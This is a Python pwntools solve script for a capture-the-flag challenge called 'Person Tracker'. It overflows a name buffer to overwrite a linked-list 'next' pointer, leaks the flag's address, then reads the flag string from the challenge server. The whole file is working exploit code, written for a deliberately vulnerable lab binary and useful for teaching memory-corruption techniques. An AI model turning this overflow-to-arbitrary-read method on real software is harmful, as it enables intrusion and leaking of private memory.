#!/usr/bin/env python3
from pwn import *

# This script exploits a buffer overflow in the "Person Tracker" program
# to leak the content of the `FLAG` variable from memory.

# --- Configuration ---
# Set the binary to exploit.
# If you are running this locally, you may need to compile the C code first:
# gcc -no-pie -o chall chall.c
elf = context.binary = ELF('./chall', checksec=False)

# The address of the `FLAG` variable (which is a pointer to the flag string).
FLAG_POINTER_ADDRESS = elf.symbols['FLAG']

# --- Exploit Function ---
def get_flag(p):
    """
    Executes the two-stage exploit flow to retrieve the flag.
    """
    # STAGE 1: Leak the address of the flag string.
    # ===============================================
    log.info("--- STAGE 1: Leaking the flag's memory address ---")

    # Add two people to set up the list for the overflow.
    # Person B (index 0) -> Person A (index 1)
    p.sendlineafter(b'Enter your choice: ', b'1')
    p.sendlineafter(b'Enter their age: ', b'11')
    p.sendlineafter(b'Enter their name: ', b'Person A')

    p.sendlineafter(b'Enter your choice: ', b'1')
    p.sendlineafter(b'Enter their age: ', b'22')
    p.sendlineafter(b'Enter their name: ', b'Person B')
    log.success("Added two people to the list.")

    # Corrupt the 'next' pointer of Person B to point to the FLAG pointer's location.
    p.sendlineafter(b'Enter your choice: ', b'3')
    p.sendlineafter(b'Specify the index of the person: ', b'0')
    p.sendlineafter(b'Enter choice: ', b'2') # Modify name

    # The Person struct is { uint64_t age; char name[24]; Person* next; }
    # We craft a payload to overflow `name` and overwrite `next`.
    # We point it to where the FLAG pointer is stored in memory.
    payload_stage1 = b'A' * 24  # Fill the name buffer
    payload_stage1 += p64(FLAG_POINTER_ADDRESS) # Overwrite `next` to point to the FLAG pointer itself
    
    p.sendlineafter(b'Enter the new name: ', payload_stage1)
    log.success(f"Sent payload to point 'next' to {hex(FLAG_POINTER_ADDRESS)}")

    # View the person at index 1 (which is now our fake person at FLAG_POINTER_ADDRESS)
    p.sendlineafter(b'Enter your choice: ', b'2')
    p.sendlineafter(b'Specify the index of the person: ', b'1')
    
    # Choose to view the "age". Because our fake person starts at FLAG_POINTER_ADDRESS,
    # its "age" is the value stored there, which is the address of the flag string.
    p.sendlineafter(b'Enter choice: ', b'1')
    p.recvuntil(b'Their age is ')
    
    flag_string_address = int(p.recvline().strip())
    log.success(f"Leaked flag string address: {hex(flag_string_address)}")


    # STAGE 2: Use the leaked address to read the flag string.
    # ========================================================
    log.info("--- STAGE 2: Reading the flag string ---")

    # We need to set up the list again to perform a second overflow.
    p.sendlineafter(b'Enter your choice: ', b'1')
    p.sendlineafter(b'Enter their age: ', b'33')
    p.sendlineafter(b'Enter their name: ', b'Person C')
    
    p.sendlineafter(b'Enter your choice: ', b'1')
    p.sendlineafter(b'Enter their age: ', b'44')
    p.sendlineafter(b'Enter their name: ', b'Person D')
    log.success("Reset the list with two more people.")

    # Corrupt the 'next' pointer of Person D to point to our leaked address.
    p.sendlineafter(b'Enter your choice: ', b'3')
    p.sendlineafter(b'Specify the index of the person: ', b'2') # Index is 2 now
    p.sendlineafter(b'Enter choice: ', b'2') # Modify name
    
    # This time, we point to (leaked_address - 8). When the program accesses
    # the 'name' field (at offset +8), it will land exactly on the flag string.
    payload_stage2 = b'B' * 24
    payload_stage2 += p64(flag_string_address - 8)
    
    p.sendlineafter(b'Enter the new name: ', payload_stage2)
    log.success(f"Sent payload to point to {hex(flag_string_address - 8)}")

    # View the person at index 3 (our new fake person)
    p.sendlineafter(b'Enter your choice: ', b'2')
    p.sendlineafter(b'Specify the index of the person: ', b'3')
    
    # Choose to view the "name", which will now print the flag.
    p.sendlineafter(b'Enter choice: ', b'2')
    p.recvuntil(b'Their name is ')
    
    flag = p.recvline().strip().decode()
    log.success(f"Flag Leaked: {flag}")
    
    return flag

if __name__ == "__main__":
    # For a remote challenge, use remote(). For local, use process().
    # You might need to change the host and port.
    p = remote('challs.watctf.org', 5151)
    
    flag = get_flag(p)
    
    p.close()
    
    print("\n" + "="*50)
    print(f"Successfully retrieved the flag: {flag}")
    print("="*50)

